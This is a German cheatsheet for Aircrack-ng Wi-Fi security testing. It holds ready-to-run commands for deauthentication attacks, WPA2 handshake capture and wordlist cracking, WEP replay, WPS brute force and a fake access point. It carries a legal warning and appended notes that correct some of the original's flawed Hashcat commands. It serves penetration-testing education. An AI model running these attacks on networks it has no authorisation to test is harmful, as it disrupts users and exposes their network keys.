# 📶 Aircrack-ng – Cheatsheet für WLAN-Sicherheitstests

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Werkzeugsammlung für WLAN-Sicherheitstests
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Aircrack-ng?](#-was-ist-aircrack-ng)
- [Installation](#-installation)
- [Monitor-Modus](#-monitor-modus)
- [Bestandsaufnahme (airodump-ng)](#-bestandsaufnahme-airodump-ng)
- [Deauthentifizierung (aireplay-ng)](#-deauthentifizierung-aireplay-ng)
- [WPA-/WPA2-Schlüssel ermitteln](#-wpa-wpa2-schlüssel-ermitteln)
- [WEP-Schlüssel ermitteln](#-wep-schlüssel-ermitteln)
- [WPS-Angriffe](#-wps-angriffe)
- [Weitere Werkzeuge](#-weitere-werkzeuge)
- [Vollständiger Angriffsablauf](#-vollständiger-angriffsablauf)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist Aircrack-ng?

**Aircrack-ng** ist eine Werkzeugsammlung zur Sicherheitsprüfung von WLAN-Netzen. Dazu gehören:

- 📡 **airodump-ng** – Pakete aufzeichnen und Netzwerke erkennen
- 💥 **aireplay-ng** – Pakete einspeisen und Deauthentifizierungsangriffe durchführen
- 🔓 **aircrack-ng** – WEP- und WPA-/WPA2-Schlüssel ermitteln
- 🔧 **airmon-ng** – Monitor-Modus aktivieren/deaktivieren
- 📝 **airodecap-ng** – Aufgezeichneten Datenverkehr entschlüsseln

### Voraussetzungen

| Voraussetzung | Beschreibung |
|-------------|-------------|
| **WLAN-Adapter** | Muss Monitor-Modus und Paketinjektion unterstützen |
| **Unterstützte Chipsätze** | Atheros, Ralink, Realtek (teilweise) |
| **Betriebssystem** | Linux empfohlen (Kali) |

### Verbreitete kompatible Adapter

| Adapter | Chipsatz | Hinweise |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | Dualband, leistungsfähig |
| Alfa AWUS036NHA | Atheros AR9271 | Bewährt, zuverlässig |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Preisgünstige Option |

---

## 🚀 Installation

### Kali Linux (vorinstalliert)

```bash
# Bereits installiert, Version prüfen
aircrack-ng --version

# Aktualisieren
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Aus dem Quellcode

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Monitor-Modus

### WLAN-Schnittstelle prüfen

```bash
# WLAN-Schnittstellen auflisten
iwconfig

# Alternativ
iw dev

# Alternativ
airmon-ng
```

### Monitor-Modus aktivieren

```bash
# Methode 1: airmon-ng (empfohlen)
sudo airmon-ng start wlan0

# Output: Monitor mode enabled on wlan0mon

# Methode 2: Manuell
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Störende Prozesse beenden

```bash
# Möglicherweise störende Prozesse beenden
sudo airmon-ng check kill

# Alternativ manuell
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Monitor-Modus deaktivieren

```bash
# Monitor-Modus beenden
sudo airmon-ng stop wlan0mon

# NetworkManager neu starten
sudo systemctl start NetworkManager
```

### Kanal ändern

```bash
# Einen bestimmten Kanal einstellen
sudo iwconfig wlan0mon channel 6

# Alternativ mit airmon-ng
sudo airmon-ng start wlan0 6
```

---

## 🔍 Bestandsaufnahme (airodump-ng)

### Einfache Suche

```bash
# Alle Netzwerke suchen
sudo airodump-ng wlan0mon

# Ausgabe:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Bestimmtes Frequenzband untersuchen

```bash
# Nur 2.4GHz
sudo airodump-ng --band g wlan0mon

# Nur 5GHz
sudo airodump-ng --band a wlan0mon

# Beide Frequenzbänder
sudo airodump-ng --band abg wlan0mon
```

### Ein bestimmtes Netzwerk auswählen

```bash
# Nach Kanal und BSSID filtern
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Mitschnitt in eine Datei schreiben
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Erstellt: capture-01.cap, capture-01.csv usw.
```

### Ausgabe verstehen

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Feld | Beschreibung |
|-------|-------------|
| BSSID | MAC-Adresse des Access Points (AP) |
| PWR | Signalstärke (näher an 0 = stärker) |
| Beacons | Anzahl der Beacon-Frames |
| #Data | Anzahl der Datenpakete |
| CH | Kanal |
| ENC | Verschlüsselung (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Netzwerkname |
| STATION | MAC-Adresse eines verbundenen Clients |

### Filteroptionen

```bash
# Nur verschlüsselte Netzwerke anzeigen
sudo airodump-ng --encrypt wpa2 wlan0mon

# Nur WEP anzeigen
sudo airodump-ng --encrypt wep wlan0mon

# Bestimmte ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Deauthentifizierung (aireplay-ng)

### Warum Deauth?

Eine Deauthentifizierung unterbricht die Verbindung von Clients, damit sie sich erneut anmelden und der für die WPA-/WPA2-Schlüsselsuche benötigte 4-Way-Handshake aufgezeichnet werden kann.

### Einen einzelnen Client deauthentifizieren

```bash
# Einen bestimmten Client deauthentifizieren
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Deauthentifizierungsangriff
# 5  : Anzahl der Deauthentifizierungen (0 = unbegrenzt)
# -a : BSSID des AP
# -c : MAC-Adresse des Clients
```

### Alle Clients deauthentifizieren

```bash
# Broadcast-Deauthentifizierung (alle Clients)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Aggressiver
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Auf einen Handshake prüfen

```
# In airodump-ng auf folgende Meldung achten:
WPA handshake: AA:BB:CC:DD:EE:FF

# Die Meldung erscheint oben rechts
```

---

## 🔓 WPA-/WPA2-Schlüssel ermitteln

### Vollständiger WPA2-Angriffsablauf

```bash
# Schritt 1: Monitor-Modus aktivieren
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Schritt 2: Netzwerke suchen
sudo airodump-ng wlan0mon

# Schritt 3: Ein bestimmtes Netzwerk auswählen (Mitschnitt)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Schritt 4: Client deauthentifizieren (neues Terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Schritt 5: Auf den Handshake warten (Anzeige in airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Schritt 6: Mit einer Wortliste prüfen
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Wörterbuchangriff

```bash
# Einfacher Wörterbuchangriff
aircrack-ng -w wordlist.txt capture-01.cap

# rockyou verwenden
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Mehrere Wortlisten
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Ziel-ESSID angeben

```bash
# Falls der Mitschnitt mehrere Netzwerke enthält
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Alternativ anhand der BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Hashcat verwenden (Beschleunigung durch GPU)

```bash
# CAP in das Hashcat-Format umwandeln
aircrack-ng capture-01.cap -J hashcat_file
# Erstellt: hashcat_file.hccapx

# Alternativ cap2hccapx verwenden
cap2hccapx capture-01.cap hashcat_file.hccapx

# Mit Hashcat prüfen
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 für das ältere hccap-Format
```

### Formate umwandeln

```bash
# CAP in HCCAPX umwandeln (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# CAP in PCAP umwandeln
editcap capture-01.cap output.pcap

# Mehrere CAP-Dateien zusammenführen
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 WEP-Schlüssel ermitteln

> ⚠️ WEP ist veraltet und unsicher. Heute verwenden die meisten Netzwerke WPA2/WPA3.

### WEP-Angriffsarten

| Angriff | Beschreibung |
|--------|-------------|
| ARP Replay | ARP-Pakete aufzeichnen und erneut senden |
| Fake Auth | Ohne Schlüssel beim AP anmelden |
| Fragmentation | Schlüsselstrom erzeugen |
| ChopChop | Pakete ohne Schlüssel entschlüsseln |

### Einfacher WEP-Angriff

```bash
# Schritt 1: Datenverkehr aufzeichnen
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Schritt 2: Authentifizierung vortäuschen
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Schritt 3: ARP-Replay-Angriff
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Schritt 4: Bei genügend IVs (>50,000) den Schlüssel ermitteln
sudo aircrack-ng wep_capture-01.cap
```

### Angriffsmodi von aireplay-ng

| Modus | Beschreibung |
|------|-------------|
| `-0` | Deauthentifizierung |
| `-1` | Vorgetäuschte Authentifizierung |
| `-2` | Interaktives erneutes Senden von Paketen |
| `-3` | Erneutes Senden von ARP-Anfragen |
| `-4` | KoreK-ChopChop-Angriff |
| `-5` | Fragmentierungsangriff |
| `-9` | Test der Paketinjektion |

---

## 🔓 WPS-Angriffe

### Reaver verwenden

```bash
# Reaver installieren
sudo apt install reaver

# Einfacher WPS-Angriff
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Mit Kanalangabe
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie-Dust-Angriff (schneller)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Bully verwenden

```bash
# Bully installieren
sudo apt install bully

# Einfacher Angriff
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (APs mit aktiviertem WPS finden)

```bash
# Nach WPS-Netzwerken suchen
sudo wash -i wlan0mon

# Die Ausgabe zeigt:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Weitere Werkzeuge

### airbase-ng (vorgetäuschter AP)

```bash
# Einen vorgetäuschten AP erstellen
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Mit einer bestimmten BSSID
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (Mitschnitte entschlüsseln)

```bash
# WPA-Mitschnitt mit bekanntem Schlüssel entschlüsseln
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# WEP-Mitschnitt entschlüsseln
airdecap-ng -w <wep_key> capture-01.cap
```

### Optionen von aircrack-ng

```bash
# Alle Optionen anzeigen
aircrack-ng --help

# Mehrere CPU-Kerne verwenden
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Ausgabe unterdrücken
aircrack-ng -q -w wordlist.txt capture-01.cap

# ESSID angeben
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (Pakete erstellen)

```bash
# ARP-Paket erstellen
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Vollständiger Angriffsablauf

### WPA2-Angriff (Schritt für Schritt)

```bash
# Terminal 1: Vorbereitung
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Monitor-Modus prüfen
iwconfig  # Sollte wlan0mon anzeigen

# Terminal 1: Netzwerke suchen
sudo airodump-ng wlan0mon
# BSSID, CH und ESSID des Ziels notieren

# Terminal 1: Ziel auswählen und aufzeichnen
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Terminal 2: Deauthentifizierungsangriff
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# In Terminal 1 auf "WPA handshake: XX:XX:XX:XX:XX:XX" warten
# Mitschnitt mit Ctrl+C beenden

# Terminal 1: Handshake mit Wortliste prüfen
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Alternativ mit Hashcat (GPU – schneller)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Nach dem Angriff aufräumen

```bash
# Monitor-Modus beenden
sudo airmon-ng stop wlan0mon

# NetworkManager neu starten
sudo systemctl start NetworkManager

# Dateien aufräumen (optional)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Schnellübersicht

### Wichtige Befehle

| Zweck | Befehl |
|---------|---------|
| Monitor-Modus aktivieren | `airmon-ng start wlan0` |
| Monitor-Modus deaktivieren | `airmon-ng stop wlan0mon` |
| Störende Prozesse beenden | `airmon-ng check kill` |
| Netzwerke suchen | `airodump-ng wlan0mon` |
| Netzwerk auswählen | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Deauthentifizieren | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| WPA-Schlüssel ermitteln | `aircrack-ng -w wordlist.txt capture.cap` |

### Angriffsübersicht

| Angriff | Verschlüsselung | Vorgehen |
|--------|------------|--------|
| Wörterbuch | WPA/WPA2 | Handshake aufzeichnen → Mit Wortliste prüfen |
| Reaver | WPS | WPS-PIN per Brute Force ermitteln |
| Pixie-Dust | WPS | Offline-Angriff auf WPS |
| ARP Replay | WEP | IVs sammeln → Schlüssel ermitteln |

### Nützliche Wortlisten

| Pfad | Beschreibung |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | Häufig verwendet (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Schnelle Prüfung |
| `/usr/share/seclists/Passwords/` | SecLists-Sammlung |

### Fehlerbehebung

```bash
# Schnittstelle wechselt nicht in den Monitor-Modus
sudo rfkill unblock wifi
sudo rfkill unblock all

# Prüfen, ob der Treiber Paketinjektion unterstützt
sudo aireplay-ng -9 wlan0mon

# Kein Handshake aufgezeichnet
# - Näher an das Ziel herangehen
# - Andere Clients versuchen
# - Aggressiver deauthentifizieren
# - Länger warten

# Airmon meldet "Found X processes"
sudo airmon-ng check kill
```

---

## ⚠️ Rechtlicher Hinweis

```
⚠️ WARNUNG: Diese Werkzeuge nur in EIGENEN Netzwerken oder mit
AUSDRÜCKLICHER SCHRIFTLICHER TESTERLAUBNIS einsetzen. Unbefugter Zugriff
auf Computernetzwerke ist in den meisten Rechtsordnungen ILLEGAL.

Verantwortungsvoll einsetzen für:
✅ Sicherheitsprüfungen
✅ Penetrationstests (mit Erlaubnis)
✅ Lernzwecke (Laborumgebung)

Niemals einsetzen für:
❌ Unbefugten Netzwerkzugriff
❌ Diebstahl von Zugangsdaten
❌ Schädliche Zwecke jeglicher Art
```

---

## 📚 Ressourcen

- [Offizielle Aircrack-ng-Website](https://www.aircrack-ng.org/)
- [Aircrack-ng-Wiki](https://www.aircrack-ng.org/doku.php)
- [Hashcat: WLAN](https://hashcat.net/wiki/)

### Verwandte Cheatsheets
- [Hashcat](../../Hashcat/translations/README.de.md)
- [Wireshark](../../Wireshark/translations/README.de.md)
- [Linux-Befehle](../../Linux-Commands/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Geltungsbereich und Handshake:** Die WPA-/WPA2-Wörterbuchbeispiele betreffen Personal-Netze mit Pre-Shared Key (PSK), nicht pauschal Enterprise oder WPA3-SAE. Ein passender Mitschnitt und ein tatsächlich passender Passwortkandidat sind nötig; die Anzeige eines Handshakes garantiert keine erfolgreiche Schlüsselsuche. Deauthentifizierung erzwingt nicht in jeder Konfiguration eine nutzbare Neuanmeldung; Protected Management Frames (PMF) schützen insbesondere etablierte Verbindungen vor gefälschten Deauth-/Disassoc-Frames. [Aircrack-ng: Funktionsweise](https://www.aircrack-ng.org/doku.php?id=aircrack-ng), [Espressif: PMF und WPA3-SAE](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-guides/wifi-security.html).
- **Hashcat-Formate:** Die Vorlage vermischt alte Binärformate und das aktuelle Textformat für Modus 22000. Bei Aircrack-ng erzeugt -j HCCAPX, -J das ältere Hashcat-Capture-Format; die erste -J-Zeile und ihre hccapx-Beschreibung passen daher nicht zusammen. Eine HCCAPX-Datei ist auch nicht unmittelbar die erwartete Eingabe für Modus 22000. Die ursprünglichen Befehle und Dateinamen bleiben unverändert. [Aircrack-ng: Optionen](https://www.aircrack-ng.org/doku.php?id=aircrack-ng#wpa-psk_options), [Hashcat: erwartetes Format](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2).
- **Hardware und Schnittstellen:** Chipfamilie oder Modellname allein garantieren keine Unterstützung; Hardware-Revision, Treiber, Kernel und Frequenzband sind maßgeblich. Auch der Name wlan0mon ist ein Beispiel, keine feste Vorgabe. check kill beendet Netzwerkverwaltungsprozesse und kann bestehende Verbindungen unterbrechen; die Wiederherstellung hängt von der Umgebung ab. [Aircrack-ng: Chipsatz und Treiber](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers), [Aircrack-ng: Monitor-Modus](https://www.aircrack-ng.org/doku.php?id=airmon-ng).
- **WEP und WPS:** Die genannte IV-Zahl ist keine Erfolgsschwelle; Schlüssel, Verfahren und geeignete Pakettypen beeinflussen das Ergebnis. Ein WPS-Eintrag oder offener WPS-Status beweist keine Pixie-Dust-Anfälligkeit; diese hängt von bestimmten Implementierungsfehlern ab. Eine Deauth-Zahl bezeichnet bei aireplay-ng Gruppen gesendeter Frames, nicht einfach genau diese Anzahl einzelner Funkpakete. [Aircrack-ng: WEP-IVs](https://www.aircrack-ng.org/doku.php?id=faq#how_many_ivs_are_required_to_crack_wep), [Reaver: Pixie Dust](https://github.com/t6x/reaver-wps-fork-t6x), [Aircrack-ng: Deauthentifizierung](https://www.aircrack-ng.org/doku.php?id=deauthentication).
- **Schreibweise:** Der Werkzeugname airodecap-ng in der Einleitung ist ein Tippfehler des Originals; der spätere Abschnitt verwendet korrekt airdecap-ng. Die Einführungsschreibweise bleibt zur Nachvollziehbarkeit erhalten. [Aircrack-ng: Entschlüsselungswerkzeug](https://www.aircrack-ng.org/doku.php?id=airdecap-ng).

---

<p align="center">
  <b>📶 WLAN-Sicherheitstests beherrschen!</b><br>
  <i>Aircrack-ng – ein Begleiter für WLAN-Penetrationstests</i>
</p>
